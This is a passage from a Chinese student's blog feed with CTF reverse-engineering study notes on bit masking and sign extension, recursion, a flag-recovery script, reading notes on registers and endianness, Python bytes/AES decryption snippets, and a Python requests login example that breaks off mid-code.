    <content type="html"><![CDATA[<h2 id="starts"><a href="#starts" class="headerlink" title="starts"></a>starts</h2><p>在做normal5的时候有遇到很多不会的地方，比如为什么要对数据按位与（0xff），补0扩展和符号位扩展有什么用，这些操作和数据的关联。其实类似于这个0xff在level7的时候已经遇到过一次，当时只知道是为了防止数据溢出，当我在对normal5最后flag的数据操作时发现ff的个数会影响最后得到的数据，且对数据的操作顺序改变会导致flag得到不是想要的数据。于是打算好好看一下这个问题。</p><h2 id="amp"><a href="#amp" class="headerlink" title="&amp;"></a>&amp;</h2><p>&amp;上一个0xff的起因大概是用一个dword和byte进行了比较，提取数据的时候数据是这样的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xFFFFFFC4, 0x00000034, 0x00000022, 0xFFFFFFB1, 0xFFFFFFD3, 0x00000011, 0xFFFFFF97, 0x00000007, 0xFFFFFFDB, 0x00000037, 0xFFFFFFC4, 0x00000006, 0x0000001D, 0xFFFFFFFC, 0x0000005B, 0xFFFFFFED, 0xFFFFFF98, 0xFFFFFFDF, 0xFFFFFF94, 0xFFFFFFD8, 0xFFFFFFB3, 0xFFFFFF84, 0xFFFFFFCC, 0x00000008</span><br></pre></td></tr></table></figure><p>询问了别人这个0xff是怎么回事，现在大概了解了一些，所谓的高位清零是什么意思。0xff转化为二进制数就是1111111，一共有8个bit，一个字节。&amp;0xff就是使这个数字的低8bit不变，其他的全部清零，因为&amp;的意思就是1&amp;1为1，其他都是0。这样将这个数字&amp;0xff就使低8bit这个byte是1就是1，是0就是0，把高位全部清零，从而可以限制到一个字节的大小。这样一来就可以进行比较了。</p><h2 id="movsx-movzx"><a href="#movsx-movzx" class="headerlink" title="movsx  /  movzx"></a>movsx  /  movzx</h2><p>MOVZX 指令（进行全零扩展并传送）将源操作数复制到目的操作数，并把目的操作数 0 扩展到 16 位或 32 位。这条指令只用于无符号整数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov bx, 0A69Bh</span><br><span class="line">movzx eax, bx     ;EAX = 0000A69Bh</span><br><span class="line">movzx edx, bl     ;EDX = 0000009Bh</span><br><span class="line">movzx cx, bl     ;CX = 009Bh</span><br></pre></td></tr></table></figure><p>MOVSX 指令（进行符号扩展并传送）将源操作数内容复制到目的操作数，并把目的操作数符号扩展到 16 位或 32 位。这条指令只用于有符号整数。（符号位就是0或者1）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">byteVal BYTE 10001111b</span><br><span class="line">.code</span><br><span class="line">movsx ax,byteVal      ;AX = 1111111110001111b</span><br></pre></td></tr></table></figure><p>看了别人对normal5的分析，这里对符号位进行扩展的原因是flag里面有负数。输出字符如果是负数那么就没办法转字符了。</p><p>去找了一下可以理解符号位扩展的文章，这个例子就比较容易理解：</p><p>以-64为例，其8位的二进制补码（1100 0000）表示成十六进制是0xC0，而等效的16位二进制补码（1111 1111 1100 0000）表示成十六进制是0xFFC0，很显然，位模式不一样。再看数+64，其8位二进制补码（0100 0000）和16位二进制补码（0000 0000 0100 0000）表示，分别是0x40与0x0040。事实是，扩展负数的大小与扩展非负数的大小是完全不同的。</p><p>处理不同长度的有符号数时，我们必须使用符号扩展。例如，将一个字节量与一个字量相加时，在相加之前，必须将字节量符号扩展到16位，其他运算可能需要符号扩展到32位。</p><p>清零和符号位扩展大多用于比较两个长度不同的数据。</p><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>寄。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;starts&quot;&gt;&lt;a href=&quot;#starts&quot; class=&quot;headerlink&quot; title=&quot;starts&quot;&gt;&lt;/a&gt;starts&lt;/h2&gt;&lt;p&gt;在做normal5的时候有遇到很多不会的地方，比如为什么要对数据按位与（0xff），补0扩展和符号位扩展有什</summary>
      
    
    
    
    
    <category term="0-1のpython" scheme="http://example.com/tags/0-1%E3%81%AEpython/"/>
    
  </entry>
  
  <entry>
    <title>normal归纳</title>
    <link href="http://example.com/2021/12/10/induction-1/"/>
    <id>http://example.com/2021/12/10/induction-1/</id>
    <published>2021-12-10T14:07:38.000Z</published>
    <updated>2021-12-12T14:18:18.965Z</updated>
    
    <content type="html"><![CDATA[<h2 id="starts"><a href="#starts" class="headerlink" title="starts"></a>starts</h2><p>在写normal3和4的时候感受到自己看题太不仔细了，normal3在最后调试答案的时候加了头和尾，一直显示flag错误，想了一想才知道这个是因为没有看清最后题目的输出。还是要把每道题都理解透彻自己反复思考去看怎么做，哪里自己没有注意到，好好去归纳总结一下。</p><h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><p>在normal3的时候遇到了递归算法，其实一开始想的是一个replace，感觉像是给flag的值用一个str的下标来替换，调试的时候一直在很混乱的循环，也没有想到递归这层，还是平常的基础知识运用的不够熟悉，遇到这些常见的算法都反应不过来。其实按照题目的意思是一个递归的排序。</p><p>递归算法简单来说就是一种调用自身函数的算法，递归必须有明确的结束条件，不然就是无止境的循环消耗电脑内存，可以说是利弊共存。</p><p>就题目里来说递归就是这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="number">0</span></span><br><span class="line">arr = []</span><br><span class="line">arr1 = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span>(<span class="params">a</span>):</span></span><br><span class="line">    <span class="keyword">global</span> data</span><br><span class="line">    <span class="keyword">global</span> arr</span><br><span class="line">    <span class="keyword">global</span> arr1</span><br><span class="line">    <span class="keyword">if</span>(a &lt; <span class="number">64</span>):</span><br><span class="line">        arr.append(data)</span><br><span class="line">        arr1.append(a)</span><br><span class="line">        data = data + <span class="number">1</span></span><br><span class="line">        fun(<span class="number">2</span>*a + <span class="number">1</span>)</span><br><span class="line">        fun(<span class="number">2</span>*(a + <span class="number">1</span>))</span><br></pre></td></tr></table></figure><p>调用自身来进行运算</p><h2 id="hex与bytes"><a href="#hex与bytes" class="headerlink" title="hex与bytes"></a>hex与bytes</h2><p>又到了这个话题，上次写过一个hexstring和bytes的转化，写了很久，在normal4里面又碰到了这个问题。</p><img src="/2021/12/10/induction-1/1.png" class="" width="1"><img src="/2021/12/10/induction-1/2.png" class="" width="2"><p>在汇编窗口里你会发现这样的东西。<strong>byte ptr</strong>。这道题我没有调试，我直接照着伪代码逆了，结果错了，也没有想明白到底是为什么list会越界，也没有仔细去看汇编。从头再分析过来发现伪代码里的变量是被拆分了的，因为这里是把hex的字符串转成byte，然后以每两位写入。</p><img src="/2021/12/10/induction-1/3.png" class="" width="3"><p>有时候会遇到变量很多很难看，这时候就要反应过来看汇编和调试汇编了（我就没这么做就寄了），因为多个变量很有可能是组成一个地址的值或者字符，从而来replace这样，直接逆搞了好久也没有逆出东西来，一直在提示我越界。这道题其实就是一个replace，str2的下标是flag[i]的值的ascii码，只要索引str[i] ^ 0x19在str2里下标就可以了。</p><p>网上搜了一下是2018年湖湘杯的一道题，我看了爆破的脚本严重怀疑越界的可能性但应该别人出的脚本没有问题，等到有空考证了就补充上去。</p><p>果然是没问题的，自己脚本越界是因为提取的时候没有按byte提。。。爆破也可以，128个可显示字符来爆破。</p><p>在ida里有个&amp;的字符在input前面，在这个地方是明显的取址字符，碰到的时候要注意。在复习数组识别的时候也有相同的提示，例如a[a+i<em>4]，这里的a+i * 4是一个典型的整数数组的寻址，一个int为四个字节，是一个int指针，可以将类型修改成int</em>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">data1 = [0x32, 0x61, 0x34, 0x39, 0x66, 0x36, 0x39, 0x63, 0x33, 0x38, 0x33, 0x39, 0x35, 0x63, 0x64, 0x65, 0x39, 0x36, 0x64, 0x36, 0x64, 0x65, 0x39, 0x36, 0x64, 0x36, 0x66, 0x34, 0x65, 0x30, 0x32, 0x35, 0x34, 0x38, 0x34, 0x39, 0x35, 0x34, 0x64, 0x36, 0x31, 0x39, 0x35, 0x34, 0x34, 0x38, 0x64, 0x65, 0x66, 0x36, 0x65, 0x32, 0x64, 0x61, 0x64, 0x36, 0x37, 0x37, 0x38, 0x36, 0x65, 0x32, 0x31, 0x64, 0x35, 0x61, 0x64, 0x61, 0x65, 0x36, 0x00]</span><br><span class="line">data = [0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67,</span><br><span class="line"> 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47,</span><br><span class="line"> 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93,</span><br><span class="line"> 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31,</span><br><span class="line"> 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80,</span><br><span class="line"> 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A,</span><br><span class="line"> 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00,</span><br><span class="line"> 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58,</span><br><span class="line"> 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02,</span><br><span class="line"> 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38,</span><br><span class="line"> 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13,</span><br><span class="line"> 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19,</span><br><span class="line"> 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8,</span><br><span class="line"> 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24,</span><br><span class="line"> 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37,</span><br><span class="line"> 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE,</span><br><span class="line"> 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74,</span><br><span class="line"> 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6,</span><br><span class="line"> 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98,</span><br><span class="line"> 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28,</span><br><span class="line"> 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D,</span><br><span class="line"> 0x0F, 0xB0, 0x54, 0xBB, 0x16]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def fun(i):</span><br><span class="line">    if(data1[i] &lt; 48 | data1[i] &gt; 57):</span><br><span class="line">        a = data1[i] - 87</span><br><span class="line">    else:</span><br><span class="line">        a = data1[i] - 48</span><br><span class="line">    a = a * 16</span><br><span class="line">    if(data1[i+1] &lt; 48 | data1[i+1] &gt; 57):</span><br><span class="line">        b = data1[i+1] - 87</span><br><span class="line">    else:</span><br><span class="line">        b = data1[i+1] - 48</span><br><span class="line">    return ((a + b) ^ 0x19)</span><br><span class="line"></span><br><span class="line">for i in range(35):</span><br><span class="line">    z = i</span><br><span class="line">    for m in range(128):</span><br><span class="line">        a = (m &gt;&gt; 4) % 16</span><br><span class="line">        b = (16 * m &gt;&gt; 4) % 16</span><br><span class="line">        j = 16 * a + b</span><br><span class="line">        k = fun(i*2)</span><br><span class="line">        if(data[j] == k):</span><br><span class="line">            print(chr(m),end=&quot;&quot;)</span><br></pre></td></tr></table></figure><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>多归纳，，，不然会忘掉，，，</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;starts&quot;&gt;&lt;a href=&quot;#starts&quot; class=&quot;headerlink&quot; title=&quot;starts&quot;&gt;&lt;/a&gt;starts&lt;/h2&gt;&lt;p&gt;在写normal3和4的时候感受到自己看题太不仔细了，normal3在最后调试答案的时候加了头和尾，一直显示</summary>
      
    
    
    
    
    <category term="归纳" scheme="http://example.com/tags/%E5%BD%92%E7%BA%B3/"/>
    
  </entry>
  
  <entry>
    <title>《逆向工程核心原理》-1</title>
    <link href="http://example.com/2021/12/10/%E3%80%8A%E9%80%86%E5%90%91%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E3%80%8B-1/"/>
    <id>http://example.com/2021/12/10/%E3%80%8A%E9%80%86%E5%90%91%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E3%80%8B-1/</id>
    <published>2021-12-09T17:24:15.000Z</published>
    <updated>2021-12-09T18:36:28.569Z</updated>
    
    <content type="html"><![CDATA[<h2 id="starts"><a href="#starts" class="headerlink" title="starts"></a>starts</h2><p>《逆向工程核心原理》这本书是在todo list里最开头的，除了动手实践补充书上的知识也很重要，加班加点稍微写点笔记，让自己能看到些自己做了学了的东西吧。</p><h2 id="重要的"><a href="#重要的" class="headerlink" title="重要的"></a>重要的</h2><p>在开头书里写的是关于逆向工程。很重要的章节，告诉我要学什么，“嗯，先学这些概念吧，其他慢慢学”，不贪心，不急躁，希望自己也能体会到其中的乐趣，对生活和学习都热情以待吧。</p><p>前几章节主要讲了基本的调试程序和寄存器，但这些都是非常重要的部分，而我却一直记不住，写一些笔记来加深一下自己的印象。</p><h2 id="习惯"><a href="#习惯" class="headerlink" title="习惯"></a>习惯</h2><p>首先讲了调试一个简单的hello world的程序，但在调试中需要养成良好的习惯，使调试更加方便且看起来清楚。</p><p>1.学会添加注释和标签，书中示范的是od，但不论用什么调试软件，在需要的地方添加合适的注释都是需要养成的习惯。</p><p>2.在ida调试时需要对函数名称进行重命名，以方便自己的解读。进入函数看伪代码时可以通过快捷键来简化代码，或者根据分析重定义函数类型，这些在b站ida代码修复视频中有详细介绍。</p><p>暂时没有想到其他的，如果以后发现就补充上去。</p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>在书中介绍了四种调试hello world代码的方法，单步f8在代码量非常大的情况下是不可能使用的，一般来说我们会猜测并且设置断点，而在程序破解等实例中我们可以使用<strong>字符串检索法</strong>和<strong>API断点法</strong>来实现定位调用的函数。字符串检索在字符串被加密时也是不可行的，所以需要了解API的定义。</p><p>API是操作系统对用户应用程序提供的一系列函数，实现于xxx.dll文件。我们可以通过添加API断点来找出程序中调用函数的部分，从而找到关键代码。</p><h2 id="字节序"><a href="#字节序" class="headerlink" title="字节序"></a>字节序</h2><p>即大端序和小端序，BE与LE，分别采用正序和逆序的方式存储字节，大端序内存地址低位存储内存数据高位，内存地址高位位存储内存数据低位，而小端序则高存高，低存低，所以小端序是逆序输出，大端序为正序输出</p><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>反复查看寄存器是调试中必不可少的部分，也是很吃耐心的一部分，通过了解不同寄存器的作用可以大大缩短调试的时间，更快的了解程序的运行过程和数据的变化。也是看汇编指令的基础。</p><p>以E开头的寄存器为32位，分别为EAX,EBX,ECX,EDX,ESI,EDI,EBP,ESP。是八个通用寄存器。</p><p>以S结尾的6个段寄存器分别为CS,DC,SS,ES,FS,GS，他们都是16位的。</p><p>还有EFLAGS(程序状态与控制寄存器)和EIP指令指针寄存器。（32位）</p><p>平常看的最多的是<strong>通用寄存器</strong>，用于传送和暂存数据。有些寄存器可以分为高低位的独立寄存器，例如EAX，有32位。AX是EAX的低16位，AH又是AX的高8位，AL是AX的低8位。在调试时可以根据需要使用的字节数来观察独立寄存器的变化。</p><p>EAX:累加器（数据）                            EBP:扩展基址指针寄存器（栈内数据指针）</p><p>EBX:基址寄存器（数据指针）              ESI:源变址寄存器（字符串操作源指针）</p><p>ECX:计数器（字符串和循环操作）       EDI:目的变址寄存器（字符串操作目标指针）</p><p>EDX:数据寄存器（I/O指针）                 ESP:栈指针寄存器（栈指针）</p><p>ESP与EBP相互协调作用，EBP暂存ESP的值，ESP为栈顶指针，最后得到的值返回ESP。</p><p><strong>段寄存器</strong>在这里没有详细的阐述，只是做了简单的介绍，等到后面了解了再记录。</p><p><strong>程序状态寄存器</strong>中我们常常会看到的指令大概时ZF，即运算结果为0则它的值为1，常用作判断指令，与cmp等指令连用，OF和CF都是溢出数据时返回1，OF为有符号数据，CF为无符号数据。</p><p><strong>指令指针寄存器</strong>最后的就是EIP，即为指令地址，在寄存器窗口点击EIP即可返回到当下执行的地方。</p><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>其实看的内容比这些要多，这些都是基础但非常重要的知识，包括后面的栈和基础的汇编指令，但实在是太困了就先搁置下来，下次一起记录。</p><p>2021.12.10/02:25   晚安。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;starts&quot;&gt;&lt;a href=&quot;#starts&quot; class=&quot;headerlink&quot; title=&quot;starts&quot;&gt;&lt;/a&gt;starts&lt;/h2&gt;&lt;p&gt;《逆向工程核心原理》这本书是在todo list里最开头的，除了动手实践补充书上的知识也很重要，加班加点稍微</summary>
      
    
    
    
    
    <category term="读书笔记-1" scheme="http://example.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-1/"/>
    
  </entry>
  
  <entry>
    <title>python字节流与字符串与aes解密函数</title>
    <link href="http://example.com/2021/12/09/python%E5%AD%97%E8%8A%82%E6%B5%81%E4%B8%8E%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    <id>http://example.com/2021/12/09/python%E5%AD%97%E8%8A%82%E6%B5%81%E4%B8%8E%E5%AD%97%E7%AC%A6%E4%B8%B2/</id>
    <published>2021-12-09T04:42:17.000Z</published>
    <updated>2021-12-10T08:21:21.954Z</updated>
    
    <content type="html"><![CDATA[<h2 id="starts"><a href="#starts" class="headerlink" title="starts"></a>starts</h2><p>最近在开始做normal系列的题目，前面了解过一些以后大体还是能够理解题目的意思，但在写脚本上面出现了很多困难，（代码力很重要），不会写脚本然后看了wp，结果wp是py2写的，会报错，语法也有一些不太一样的，让本就py很寄的我雪上加霜。。</p><p>上面的都是废话，主要写一写python字节流和字符串还有aes十分简便的带类型的解密。</p><h2 id="字节流与字符串"><a href="#字节流与字符串" class="headerlink" title="字节流与字符串"></a>字节流与字符串</h2><p>在写脚本的时候遇到了hexstring与bytes的转换问题，于是根据指点去查了一下字节流与字符串的使用和区别。以下是资料：</p><p>Python 3最重要的新特性之一是对字符串和二进制数据流做了明确的区分。文本总是Unicode，由str类型表示，二进制数据则由bytes类型表示。Python 3不会以任意隐式的方式混用str和bytes，你不能拼接字符串和字节流，也无法在字节流里搜索字符串（反之亦然），也不能将字符串传入参数为字节流的函数（反之亦然）。</p><p>意思就是，不能够在字符串中拼接和存放bytes类型的数据，而字节流可以看作c语言中的数组，是不能与str混用的。</p><h2 id="encode与decode"><a href="#encode与decode" class="headerlink" title="encode与decode"></a>encode与decode</h2><p>那如果需要将str与bytes转换，那么就需要用到encode()（编码）和decode()（解码）两种方法，实际就是编码与解码。这也是python少数比c语言麻烦的地方。在解码编码同时需要指明编码解码类型。编码和解码类型不一致会导致出现乱码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b = a.encode(<span class="string">&#x27;utf-8&#x27;</span>) <span class="comment">#用utf-8编码集将a字符串编码为字节数组</span></span><br><span class="line">b1 = b.decode(<span class="string">&#x27;utf-8&#x27;</span>) <span class="comment">#用utf-8编码集将变量b的字节数组解码成对应字符串</span></span><br></pre></td></tr></table></figure><p>如果不编码直接使用字符串来转换成bytes类型会报错。</p><img src="/2021/12/09/python%E5%AD%97%E8%8A%82%E6%B5%81%E4%B8%8E%E5%AD%97%E7%AC%A6%E4%B8%B2/1.jpg" class="" width="1"><p>也可以直接构造bytes类型数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B = b&quot;abcd&quot;</span><br></pre></td></tr></table></figure><h2 id="二进制序列类型"><a href="#二进制序列类型" class="headerlink" title="二进制序列类型"></a>二进制序列类型</h2><p>bytes是不可变的二进制格式<strong>字节</strong>数据，而bytearray是可变的二进制数据，即可以对其进行操作来改变其中的数据。</p><p>在题目中遇到了hexstring转为bytes类型的问题，帮我改脚本的师傅用的是long_to_bytes，使用的模块是from Crypto.Util import number。当然byte_to_long也同样在模块里。（这个模块需要pip装）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes </span><br><span class="line">a = long_to_bytes(<span class="number">0x934d8706bed74cd6eea683c7be86b2eb</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="comment">#结果为 b&#x27;\x93M\x87\x06\xbe\xd7L\xd6\xee\xa6\x83\xc7\xbe\x86\xb2\xeb&#x27;</span></span><br></pre></td></tr></table></figure><p>经过查资料，使用binascii.b2a_hex()也可以实现同样的效果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">a = binascii.a2b_hex(<span class="string">b&#x27;934d8706bed74cd6eea683c7be86b2eb&#x27;</span>)<span class="comment">#必须是bytes类型</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="comment">#结果为 b&#x27;\x93M\x87\x06\xbe\xd7L\xd6\xee\xa6\x83\xc7\xbe\x86\xb2\xeb&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="AES解密函数（含aes类型）"><a href="#AES解密函数（含aes类型）" class="headerlink" title="AES解密函数（含aes类型）"></a>AES解密函数（含aes类型）</h2><p>在解决标准aes解密时，网上搜到的脚本大多数都是很多废话一大长串，实在是非常看不懂，（主要还是我菜），wp提供了一个非常简单且带有aes加密类型的解密（太好了！）于是我去了解了一下这个解密函数的用法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">aes = AES.new(key, AES.MODE_ECB) <span class="comment">#key为密钥</span></span><br><span class="line">flag = aes.decrypt(data) <span class="comment">#data是需要解密的内容</span></span><br></pre></td></tr></table></figure><p>这里的aes = AES.new(key, AES.MODE_ECB)中的ECB换成其他的类型也是成立的（<strong>CBC、ECB、CTR、OCF、CFB</strong>）</p><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>弱类型我**&amp;%￥%￥……￥#……，但是还要学……</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;starts&quot;&gt;&lt;a href=&quot;#starts&quot; class=&quot;headerlink&quot; title=&quot;starts&quot;&gt;&lt;/a&gt;starts&lt;/h2&gt;&lt;p&gt;最近在开始做normal系列的题目，前面了解过一些以后大体还是能够理解题目的意思，但在写脚本上面出现了很多困</summary>
      
    
    
    
    
    <category term="0-1のpython" scheme="http://example.com/tags/0-1%E3%81%AEpython/"/>
    
  </entry>
  
  <entry>
    <title>python request</title>
    <link href="http://example.com/2021/12/07/python-request/"/>
    <id>http://example.com/2021/12/07/python-request/</id>
    <published>2021-12-07T13:28:39.000Z</published>
    <updated>2021-12-07T13:32:31.044Z</updated>
    
    <content type="html"><![CDATA[<h2 id="start"><a href="#start" class="headerlink" title="start"></a>start</h2><p>在写模拟登录的时候需要用到python request模块，并且要抓包发包，只能说一无所知，甚至不知道url是什么。写一写给自己科普点网络常识，以方便听懂dalao们聊技术。</p><h3 id="所需要准备的包中的内容"><a href="#所需要准备的包中的内容" class="headerlink" title="所需要准备的包中的内容"></a>所需要准备的包中的内容</h3><p>url:意思是我们常称为的网址，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&quot;https://baidu.com&quot;</span></span><br></pre></td></tr></table></figure><p>user-agent:指用户代理，可以通过查看抓包的内容来看自己的user-agent，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/<span class="number">5.0</span> (Linux; Android <span class="number">10</span>; Pixel <span class="number">2</span> Build/QQ3A<span class="number">.200805</span><span class="number">.001</span>; wv) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Version/<span class="number">4.0</span> Chrome/<span class="number">74.0</span><span class="number">.3729</span><span class="number">.186</span> Mobile Safari/<span class="number">537.36</span></span><br></pre></td></tr></table></figure><p>这些是请求头中的内容，可能需要用到的还有很多，用到了在学，寄（摆烂</p><p>Accept、Accept-Charset、Accept- Encoding、Accept-Language、Authorization、From、Host、If-Modified-Since、If-Match、If-None-Match、If-Range、If-Range、If-Unmodified-Since、Max-Forwards、Proxy-Authorization、Range、Referer、User-Agent</p><p>这一大堆都可能会用到</p><p>因为这次需要实行的是模拟登录，所以发包包内需要的内容是一些登录相关的数据，在这里需要使用python字典来实现。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">login = &#123;</span><br><span class="line">     <span class="string">&quot;userName&quot;</span>:<span class="string">&quot;12345678901&quot;</span>,</span><br><span class="line">     <span class="string">&quot;app_id&quot;</span>:<span class="string">&quot;7&quot;</span>,</span><br><span class="line">     <span class="string">&quot;password&quot;</span>:<span class="string">&quot;c3l5czc5OTc=\n&quot;</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>准备工作做足了的话就可以开始写请求了）</p><h3 id="request-请求"><a href="#request-请求" class="headerlink" title="request 请求"></a>request 请求</h3><p>一般需要请求都是带参数的请求，get和post其实差距不是很大，从网上查了资料大概是这样的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hexo requests.get(url,params=&#123;<span class="string">&quot;key1&quot;</span>:<span class="string">&quot;value1&quot;</span>&#125;)</span><br><span class="line">       requests.post(url,data=&#123;<span class="string">&quot;key1&quot;</span>:<span class="string">&quot;value1&quot;</span>,<span class="string">&quot;key2&quot;</span>:<span class="string">&quot;value2&quot;</span>&#125;)</span><br><span class="line">       requests.post(url,json=&#123;<span class="string">&quot;key1&quot;</span>:<span class="string">&quot;value1&quot;</span>,<span class="string">&quot;key2&quot;</span>:<span class="string">&quot;value2&quot;</span>&#125;)</span><br></pre></td></tr></table></figure><p>如果写出来大概是这样，有请求头和respnse:(此处的body和my_header是定义的py字典)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo response = requests.post(url,params=body,headers=my_header)</span><br><span 